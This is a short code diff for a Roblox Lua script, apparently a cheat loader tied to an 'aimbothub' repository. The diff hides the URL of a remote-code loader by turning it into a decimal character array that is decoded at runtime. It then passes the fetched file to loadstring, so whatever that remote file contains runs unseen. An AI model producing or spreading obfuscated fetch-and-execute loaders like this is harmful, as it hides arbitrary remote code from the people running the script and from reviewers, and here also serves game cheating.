@@ -86,4 +86,21 @@ task.wait(1)
 screenGui:Destroy()
 
 -- 🔓 Script principal liberado
-loadstring(game:HttpGet("https://raw.githubusercontent.com/leonnxd/aimbothub/refs/heads/main/README.md"))()
+
+local t = {
+    104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,
+    101,114,99,111,110,116,101,110,116,46,99,111,109,47,108,101,111,110,110,
+    120,100,47,97,105,109,98,111,116,104,117,98,47,114,101,102,115,47,104,101,
+    97,100,115,47,109,97,105,110,47,82,69,65,68,77,69,46,109,100
+}
+
+local function decode(arr)
+    local str = ""
+    for i=1,#arr do
+        str = str .. string.char(arr[i])
+    end
+    return str
+end
+
+local url = decode(t)
+loadstring(game:HttpGet(url))()
